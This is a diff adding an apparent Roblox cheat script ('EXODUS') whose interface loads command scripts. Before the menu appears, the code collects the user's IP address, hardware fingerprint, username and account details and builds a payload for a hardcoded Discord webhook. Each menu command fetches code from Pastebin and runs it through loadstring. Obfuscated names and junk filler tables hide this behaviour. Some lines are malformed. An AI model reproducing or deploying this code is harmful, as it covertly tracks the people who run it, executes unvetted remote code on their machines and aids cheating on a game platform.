@@ -1,0 +1,668 @@
+--[[
+███████╗██╗░░██╗░█████╗░██████╗░██╗░░░██╗░██████╗  ███████╗███████╗
+██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██║░░░██║██╔════╝  ██╔════╝██╔════╝
+█████╗░░░╚███╔╝░██║░░██║██║░░██║██║░░░██║╚█████╗░  █████╗░░█████╗░░
+██╔══╝░░░██╔██╗░██║░░██║██║░░██║██║░░░██║░╚═══██╗  ██╔══╝░░██╔══╝░░
+███████╗██╔╝╚██╗╚█████╔╝██████╔╝╚██████╔╝██████╔╝  ██║░░░░░███████╗
+╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚═════╝░╚═════╝░  ╚═╝░░░░░╚══════╝
+]]--
+	
+local IP = game:HttpGet("https://v4.ident.me/%22)
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+premium = false
+end
+if premium == false then 
+if plr.AccountAge <= 70 then 
+ALT = true
+end
+end
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+local http_request = http_request;
+if syn then
+http_request = syn.request
+elseif SENTINEL_V2 then
+function http_request(tb)
+return {
+StatusCode = 200;
+Body = request(tb.Url, tb.Method, (tb.Body or ''))
+}
+end
+end
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint",
+"Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+for i, v in next, hwid_list do
+if decoded.headers[v] then
+hwid = decoded.headers[v];
+break
+end
+end
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = https://discordapp.com/api/webhooks/749890256542760961/_ZaRQBMeruB4KwWVGPS704fUSpNkmt7ZGa7ZgoUUWGI5SyWKkp5bXv0kRS3B8kUvbBZ5
+local data = 
+{
+ ["content"] = "",
+ ["embeds"] = {{
+ ["title"] = "HWID:",
+ ["description"] = hwid,
+ ["type"] = "rich",
+ ["color"] = tonumber(0xAB0909),
+ ["fields"] = {
+ {
+ ["name"] = "Username:",
+ ["value"] = Game.Players.LocalPlayer.Name,
+ ["inline"] = true
+ },
+{
+["name"] = "IP Address:",
+["value"] = IP,
+["inline"] = true
+},
+{
+["name"] = "Game Link:",
+["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+ ["inline"] = true
+ },
+{
+["name"] = "Game Name:",
+[“value"] = info.Name,
+["inline"] = true
+},
+{
+["name"] = "Age:",
+["value"] = plr.AccountAge,
+["inline"] = true
+},
+{
+["name"] = "Premium:",
+["value"] = premium,
+["inline"] = true
+},
+{
+["name"] = "ALT:",
+["value"] = ALT,
+["inline"] = true
+ },
+ },
+ }}
+ }
+local newdata = HttpServ:JSONEncode(data)
+local headers = {
+["content-type"] = "application/json"
+}
+
+local f = "https://raw.githubusercontent.com/miruluv/euphoia/master/Exodus_Whitelist"
+local ff = game:HttpGetAsync(f, true)
+local fwad = game.Players.LocalPlayer
+if string.find(ff, fwad.UserId) then 
+	local exodus_ui = Instance.new("ScreenGui")
+	local Loading = Instance.new("ImageButton")
+	local Logo = Instance.new("TextLabel")
+	local LINE = Instance.new("ImageButton")
+	local Loading_2 = Instance.new("TextLabel")
+	local Controls_Loading = Instance.new("TextLabel")
+	local Finish_Loading = Instance.new("TextButton")
+	local Watermark = Instance.new("ImageLabel")
+	local TextLabel = Instance.new("TextLabel")
+	local Controls = Instance.new("ImageButton")
+	local Logo_2 = Instance.new("TextLabel")
+	local LINE_2 = Instance.new("ImageButton")
+	local Ignore = Instance.new("TextLabel")
+	local Ignore_2 = Instance.new("TextLabel")
+	local Ignore_3 = Instance.new("TextLabel")
+	local CommandBar = Instance.new("ImageButton")
+	local Ignore_4 = Instance.new("TextLabel")
+	local LINE_3 = Instance.new("ImageButton")
+	local TextBox = Instance.new("TextBox")
+	
+	local done_loading = false
+	local ready = false
+	local canexe = false
+	
+	exodus_ui.Name = "exodus_ui"
+	exodus_ui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	
+	Loading.Name = "Loading"
+	Loading.Parent = exodus_ui
+	Loading.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	Loading.BackgroundTransparency = 1.000
+	Loading.Position = UDim2.new(1, 0, 0.739000022, 0)
+	Loading.Size = UDim2.new(0, 286, 0, 119)
+	Loading.Image = "rbxassetid://2790371148"
+	Loading.ImageColor3 = Color3.fromRGB(35, 35, 35)
+	Loading.ScaleType = Enum.ScaleType.Slice
+	Loading.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	Logo.Name = "Logo"
+	Logo.Parent = Loading
+	Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Logo.BackgroundTransparency = 1.000
+	Logo.Position = UDim2.new(0.244755238, 0, 0, 0)
+	Logo.Size = UDim2.new(0, 145, 0, 27)
+	Logo.Font = Enum.Font.GothamSemibold
+	Logo.Text = "EXODUS"
+	Logo.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Logo.TextScaled = true
+	Logo.TextSize = 14.000
+	Logo.TextWrapped = true
+	
+	LINE.Name = "LINE"
+	LINE.Parent = Loading
+	LINE.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	LINE.BackgroundTransparency = 1.000
+	LINE.Position = UDim2.new(0.00414996361, 0, 0.226590186, 0)
+	LINE.Size = UDim2.new(0, 284, 0, 3)
+	LINE.Image = "rbxassetid://2790371148"
+	LINE.ScaleType = Enum.ScaleType.Slice
+	LINE.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	Loading_2.Name = "Loading"
+	Loading_2.Parent = Loading
+	Loading_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Loading_2.BackgroundTransparency = 1.000
+	Loading_2.Position = UDim2.new(0.123031087, 0, 0.243697479, 0)
+	Loading_2.Size = UDim2.new(0, 213, 0, 27)
+	Loading_2.Font = Enum.Font.GothamSemibold
+	Loading_2.Text = "Loading."
+	Loading_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Loading_2.TextScaled = true
+	Loading_2.TextSize = 14.000
+	Loading_2.TextWrapped = true
+	
+	Controls_Loading.Name = "Controls_Loading"
+	Controls_Loading.Parent = Loading
+	Controls_Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Controls_Loading.BackgroundTransparency = 1.000
+	Controls_Loading.Position = UDim2.new(0.12303108, 0, 0.50420171, 0)
+	Controls_Loading.Size = UDim2.new(0, 213, 0, 27)
+	Controls_Loading.Font = Enum.Font.GothamSemibold
+	Controls_Loading.Text = "Controls"
+	Controls_Loading.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Controls_Loading.TextScaled = true
+	Controls_Loading.TextSize = 14.000
+	Controls_Loading.TextWrapped = true
+	
+	Finish_Loading.Name = "Finish_Loading"
+	Finish_Loading.Parent = Loading
+	Finish_Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Finish_Loading.BackgroundTransparency = 1.000
+	Finish_Loading.Position = UDim2.new(0.12303108, 0, 0.739495873, 0)
+	Finish_Loading.Size = UDim2.new(0, 213, 0, 27)
+	Finish_Loading.Font = Enum.Font.GothamSemibold
+	Finish_Loading.Text = "Done."
+	Finish_Loading.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Finish_Loading.TextScaled = true
+	Finish_Loading.TextSize = 14.000
+	Finish_Loading.TextWrapped = true
+	Finish_Loading.Visible = false
+	
+	Watermark.Name = "Watermark"
+	Watermark.Parent = exodus_ui
+	Watermark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Watermark.BackgroundTransparency = 1.000
+	Watermark.Size = UDim2.new(0, 58, 0, 54)
+	Watermark.Image = "rbxgameasset://Images/exodus_logo"
+	Watermark.ImageTransparency = 0.500
+	
+	TextLabel.Parent = Watermark
+	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.BackgroundTransparency = 1.000
+	TextLabel.Position = UDim2.new(0.985049546, 0, 0.166355416, 0)
+	TextLabel.Size = UDim2.new(0, 145, 0, 35)
+	TextLabel.Font = Enum.Font.GothamSemibold
+	TextLabel.Text = "EXODUS"
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.TextScaled = true
+	TextLabel.TextSize = 14.000
+	TextLabel.TextTransparency = 0.500
+	TextLabel.TextWrapped = true
+	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+	
+	Controls.Name = "Controls"
+	Controls.Parent = exodus_ui
+	Controls.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	Controls.BackgroundTransparency = 1.000
+	Controls.Position = UDim2.new(1, 0, 0.739000022, 0)
+	Controls.Size = UDim2.new(0, 286, 0, 119)
+	Controls.Image = "rbxassetid://2790371148"
+	Controls.ImageColor3 = Color3.fromRGB(35, 35, 35)
+	Controls.ScaleType = Enum.ScaleType.Slice
+	Controls.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	Logo_2.Name = "Logo"
+	Logo_2.Parent = Controls
+	Logo_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Logo_2.BackgroundTransparency = 1.000
+	Logo_2.Position = UDim2.new(0.244755238, 0, 0, 0)
+	Logo_2.Size = UDim2.new(0, 145, 0, 27)
+	Logo_2.Font = Enum.Font.GothamSemibold
+	Logo_2.Text = "EXODUS"
+	Logo_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Logo_2.TextScaled = true
+	Logo_2.TextSize = 14.000
+	Logo_2.TextWrapped = true
+	
+	LINE_2.Name = "LINE"
+	LINE_2.Parent = Controls
+	LINE_2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	LINE_2.BackgroundTransparency = 1.000
+	LINE_2.Position = UDim2.new(0.00414996361, 0, 0.226590186, 0)
+	LINE_2.Size = UDim2.new(0, 284, 0, 3)
+	LINE_2.Image = "rbxassetid://2790371148"
+	LINE_2.ScaleType = Enum.ScaleType.Slice
+	LINE_2.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	Ignore.Name = "Ignore"
+	Ignore.Parent = Controls
+	Ignore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore.BackgroundTransparency = 1.000
+	Ignore.Position = UDim2.new(0.123031087, 0, 0.285714298, 0)
+	Ignore.Size = UDim2.new(0, 213, 0, 27)
+	Ignore.Font = Enum.Font.GothamSemibold
+	Ignore.Text = "Controls:"
+	Ignore.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore.TextScaled = true
+	Ignore.TextSize = 14.000
+	Ignore.TextWrapped = true
+	
+	Ignore_2.Name = "Ignore"
+	Ignore_2.Parent = Controls
+	Ignore_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_2.BackgroundTransparency = 1.000
+	Ignore_2.Position = UDim2.new(0.12303108, 0, 0.554621875, 0)
+	Ignore_2.Size = UDim2.new(0, 213, 0, 16)
+	Ignore_2.Font = Enum.Font.GothamSemibold
+	Ignore_2.Text = "Keypad: 8 | To Open"
+	Ignore_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_2.TextScaled = true
+	Ignore_2.TextSize = 14.000
+	Ignore_2.TextWrapped = true
+	
+	Ignore_3.Name = "Ignore"
+	Ignore_3.Parent = Controls
+	Ignore_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_3.BackgroundTransparency = 1.000
+	Ignore_3.Position = UDim2.new(0.12303108, 0, 0.739495814, 0)
+	Ignore_3.Size = UDim2.new(0, 213, 0, 16)
+	Ignore_3.Font = Enum.Font.GothamSemibold
+	Ignore_3.Text = "Keypad: 2 | To Close"
+	Ignore_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_3.TextScaled = true
+	Ignore_3.TextSize = 14.000
+	Ignore_3.TextWrapped = true
+	
+	CommandBar.Name = "CommandBar"
+	CommandBar.Parent = exodus_ui
+	CommandBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	CommandBar.BackgroundTransparency = 1.000
+	CommandBar.Position = UDim2.new(1, 0,0.739, 0)
+	CommandBar.Size = UDim2.new(0, 576, 0, 79)
+	CommandBar.Image = "rbxassetid://2790371148"
+	CommandBar.ImageColor3 = Color3.fromRGB(35, 35, 35)
+	CommandBar.ScaleType = Enum.ScaleType.Slice
+	CommandBar.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	Ignore_4.Name = "Ignore"
+	Ignore_4.Parent = CommandBar
+	Ignore_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_4.BackgroundTransparency = 1.000
+	Ignore_4.Position = UDim2.new(0.324616313, 0, 0, 0)
+	Ignore_4.Size = UDim2.new(0, 202, 0, 17)
+	Ignore_4.Font = Enum.Font.GothamSemibold
+	Ignore_4.Text = "Insert | To Execute"
+	Ignore_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Ignore_4.TextScaled = true
+	Ignore_4.TextSize = 14.000
+	Ignore_4.TextWrapped = true
+	
+	LINE_3.Name = "LINE"
+	LINE_3.Parent = CommandBar
+	LINE_3.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	LINE_3.BackgroundTransparency = 1.000
+	LINE_3.Position = UDim2.new(0.00400000019, 0, 0.25999999, 0)
+	LINE_3.Size = UDim2.new(0, 573, 0, 3)
+	LINE_3.Image = "rbxassetid://2790371148"
+	LINE_3.ScaleType = Enum.ScaleType.Slice
+	LINE_3.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	TextBox.Parent = CommandBar
+	TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextBox.BackgroundTransparency = 1.000
+	TextBox.Position = UDim2.new(0.0309999995, 0, 0.340000004, 0)
+	TextBox.Size = UDim2.new(0, 540, 0, 46)
+	TextBox.Font = Enum.Font.GothamSemibold
+	TextBox.PlaceholderText = "Command Here"
+	TextBox.Text = ""
+	TextBox.TextColor3 = Color3.fromRGB(255,255,255)
+	TextBox.TextSize = 26.000
+	TextBox.TextWrapped = true
+	TextBox.TextXAlignment = Enum.TextXAlignment.Left
+	
+	local Commands = Instance.new("ImageButton")
+	local fuckfuck = Instance.new("TextLabel")
+	local NOTHING = Instance.new("ImageButton")
+	local ScrollingFrame = Instance.new("ScrollingFrame")
+	local UIListLayout = Instance.new("UIListLayout")
+	local CommandButton = Instance.new("TextButton")
+	
+	Commands.Name = "Commands"
+	Commands.Parent = exodus_ui
+	Commands.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	Commands.BackgroundTransparency = 1.000
+	Commands.Position = UDim2.new(1, 0, 0.0115968585, 0)
+	Commands.Size = UDim2.new(0, 229, 0, 388)
+	Commands.Image = "rbxassetid://2790371148"
+	Commands.ImageColor3 = Color3.fromRGB(35, 35, 35)
+	Commands.ScaleType = Enum.ScaleType.Slice
+	Commands.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	fuckfuck.Name = "fuckfuck"
+	fuckfuck.Parent = Commands
+	fuckfuck.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	fuckfuck.BackgroundTransparency = 1.000
+	fuckfuck.Position = UDim2.new(0.0582408644, 0, 0.0257731955, 0)
+	fuckfuck.Size = UDim2.new(0, 202, 0, 35)
+	fuckfuck.Font = Enum.Font.GothamSemibold
+	fuckfuck.Text = "EXODUS"
+	fuckfuck.TextColor3 = Color3.fromRGB(255, 255, 255)
+	fuckfuck.TextScaled = true
+	fuckfuck.TextSize = 14.000
+	fuckfuck.TextWrapped = true
+	
+	NOTHING.Name = "NOTHING"
+	NOTHING.Parent = Commands
+	NOTHING.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	NOTHING.BackgroundTransparency = 1.000
+	NOTHING.Position = UDim2.new(0, 0, 0.141443267, 0)
+	NOTHING.Size = UDim2.new(0, 228, 0, 3)
+	NOTHING.Image = "rbxassetid://2790371148"
+	NOTHING.ScaleType = Enum.ScaleType.Slice
+	NOTHING.SliceCenter = Rect.new(32, 32, 224, 224)
+	
+	ScrollingFrame.Parent = Commands
+	ScrollingFrame.Active = true
+	ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ScrollingFrame.BackgroundTransparency = 1.000
+	ScrollingFrame.Position = UDim2.new(0.113537118, 0, 0.14690721, 0)
+	ScrollingFrame.Size = UDim2.new(0, 177, 0, 320)
+	ScrollingFrame.ScrollBarThickness = 0
+	
+	UIListLayout.Parent = ScrollingFrame
+	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	
+	CommandButton.Name = "CommandButton"
+	CommandButton.Parent = UIListLayout
+	CommandButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	CommandButton.BackgroundTransparency = 1.000
+	CommandButton.Size = UDim2.new(0, 163, 0, 43)
+	CommandButton.Font = Enum.Font.GothamSemibold
+	CommandButton.Text = ""
+	CommandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	CommandButton.TextScaled = true
+	CommandButton.TextSize = 14.000
+	CommandButton.TextWrapped = true
+	
+	
+	local USERINPUT = game:GetService("UserInputService")
+	local TWEEN = game:GetService("TweenService")
+	
+	Controls_Open_Position=UDim2.new(0.624, 0,0.739, 0)
+	Controls_Close_Position=UDim2.new(1, 0,0.739, 0)
+	
+	Loading_Open_Position=UDim2.new(0.812, 0,0.739, 0)
+	Loading_Close_Position=UDim2.new(1, 0,0.739, 0)
+	
+	Command_Bar_Open_Position=UDim2.new(0.639, 0,0.739, 0)
+	Command_Bar_Close_Position=UDim2.new(1, 0,0.739, 0)
+	
+	Commands_Position_Open= UDim2.new(0.841, 0,0.012, 0)
+	Commands_Position_Close= UDim2.new(1, 0,0.012, 0)
+	
+	local function dsfjifdjifgdjidfsijk(frame, pos)
+		TWEEN:Create(frame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = pos}):Play()
+	end
+	
+	local rtjiefjiefjiefjiergfjieji = {
+		'/cmds';
+		'/reanimate';
+		'/neptunian';
+		'/penis';
+		'/sonic';
+		'/joy';
+		'/elio';
+		'/ender';
+		'/neko';
+		'/chill';
+		'/lutris';
+		'/krystal';
+		'/pen';
+		'/xester';
+		'/caducus';
+		'/leave';
+	}
+	
+	local rtjiefjiefjiefjiergfjiejii = {
+		{'/cmds'};
+		{'/reanimate'};
+		{'/neptunian'};
+		{'/penis'};
+		{'/sonic'};
+		{'/joy'};
+		{'/elio'};
+		{'/ender'};
+		{'/neko'};
+		{'/chill'};
+		{'/lutris'};
+		{'/krystal'};
+		{'/pen'};
+		{'/xester'};
+		{'/caducus'};
+		{'/leave'};
+	}
+	
+	local open = false
+	
+	
+	local function grjierjierjierjijife()
+		if open == false then
+			dsfjifdjifgdjidfsijk(Commands, Commands_Position_Open)
+			open = true
+		elseif open == true then
+			dsfjifdjifgdjidfsijk(Commands, Commands_Position_Close)
+			open = false
+		end	
+	end
+	
+	local function erjretjierwjioerjioerijok()
+		TextBox.Text = ''
+		dsfjifdjifgdjidfsijk(CommandBar, Command_Bar_Close_Position)
+		canexe = false
+	end
+	
+	local function drawfhgrfesgrehrgrgrte()
+		TextBox.Text = ''
+		dsfjifdjifgdjidfsijk(CommandBar, Command_Bar_Open_Position)
+		canexe = true
+	end
+	
+	wait(3)
+	
+	local cmdone,cmdtwo,cmdthree,cmdfour,cmdfive,cmdsix,cmdfseven,cmdeight,cmdnine,cmdten,cmdeleven,cmdtwelve,cmdthirteen,cmdfourteen,cmdfifteen,cmdfinal=table.unpack(rtjiefjiefjiefjiergfjieji)
+	
+	dsfjifdjifgdjidfsijk(Loading, Loading_Open_Position)
+	
+	Controls_Loading.MouseEnter:Connect(function()
+		dsfjifdjifgdjidfsijk(Controls, Controls_Open_Position)
+	end)
+	Controls_Loading.MouseLeave:Connect(function()
+		dsfjifdjifgdjidfsijk(Controls, Controls_Close_Position)
+	end)
+	
+	
+	for _,cmds in ipairs(rtjiefjiefjiefjiergfjiejii) do
+		local button = CommandButton:Clone()
+		button.Text = cmds[1]
+		button.Name = cmds[1]
+		button.Parent = ScrollingFrame
+		button.MouseButton1Click:Connect(function()
+			TextBox.Text = button.Text
+			game.StarterGui:SetCore("SendNotification", {
+				Title = "EXODUS";
+				Text = "COMMAND LOADED!";
+				Duration = 5;
+			})
+		end)
+	end
+	
+	local cmddd=game:HttpGetAsync("https://pastebin.com/raw/UtgaQRLL")
+	local cmdddd=game:HttpGetAsync("https://pastebin.com/raw/GpX1mJwS")
+	local cmddddd=game:HttpGetAsync("https://pastebin.com/4A55e9ic")
+	local cmdddddd=game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A")
+	local cmddddddd=game:HttpGetAsync("https://pastebin.com/raw/0B76TD7N")
+	local cmdddddddd=game:HttpGetAsync("https://pastebin.com/raw/xvBXu6Yc")
+	local cmddddddddd=game:HttpGetAsync("https://pastebin.com/raw/hv190Xiq")
+	local cmdddddddddd=game:HttpGetAsync("https://pastebin.com/raw/YLfR8Qx9")
+	local cmddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/XmHFdTij")
+	local cmdddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/6jeamwQL")
+	local cmddddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/cCMJ9C82")
+	local cmdddddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/TELjLdEU")
+	local cmddddddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/1qcpeuDm")
+	local cmdddddddddddddddd=game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi")
+	
+	local function runcommand()
+		if TextBox.Text == cmdone then
+			grjierjierjierjijife()
+		end
+		if TextBox.Text == cmdtwo then
+			loadstring(cmddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdthree then
+			loadstring(cmdddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfour then
+			loadstring(cmddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfive then
+			loadstring(cmdddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdsix then
+			loadstring(cmddddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfseven then
+			loadstring(cmdddddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdeight then
+			loadstring(cmddddddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdnine then
+			loadstring(cmdddddddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdten then
+			loadstring(cmddddddddddd)() 
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdeleven then
+			loadstring(cmdddddddddddd)() 
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdtwelve then
+			loadstring(cmddddddddddddd)() 
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdthirteen then
+			loadstring(cmdddddddddddddd)()
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfourteen then
+			loadstring(cmddddddddddddddd)() 
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfifteen then
+			loadstring(cmdddddddddddddddd)() 
+			erjretjierwjioerjioerijok()
+		end
+		if TextBox.Text == cmdfinal then
+			game.Players.LocalPlayer:Kick('Left Game | /leave;')
+			erjretjierwjioerjioerijok()
+		end	
+	end
+	
+	Loading_2.Text = "Loading."
+	wait(2)
+	Loading_2.Text = "Loading.."
+	wait(2)
+	Loading_2.Text = "Loading..."
+	wait(2)
+	Loading_2.Text = "Loading."
+	wait(2)
+	Loading_2.Text = "Loading.."
+	wait(2)
+	Loading_2.Text = "Loading..."
+	wait(2)
+	done_loading = true
+	Loading_2.Text = "Finished Loading, Enjoy."
+	Finish_Loading.Visible = true
+	
+	Finish_Loading.MouseButton1Click:Connect(function()
+		if done_loading then
+			dsfjifdjifgdjidfsijk(Loading, Loading_Close_Position)
+			ready = true
+		end
+	end)
+	
+	USERINPUT.InputBegan:Connect(function(I,II)
+		if not II and I.KeyCode == Enum.KeyCode.KeypadEight and ready then
+			drawfhgrfesgrehrgrgrte()
+		elseif not II and I.KeyCode == Enum.KeyCode.KeypadTwo and ready then
+			erjretjierwjioerjioerijok()
+		elseif not II and I.KeyCode == Enum.KeyCode.Insert and ready and canexe then
+			runcommand()
+		end
+	end)
+else
+	fwad:Kick('Nice Try You Skid XD')
+end
+local function a(a,b,c,d,cgf,gsrhyfj,dw,daw,r,rg,rg)
+	local a={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local b={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local c={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local d={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local e={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local f={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local a={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local b={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local c={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local d={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local e={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local f={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
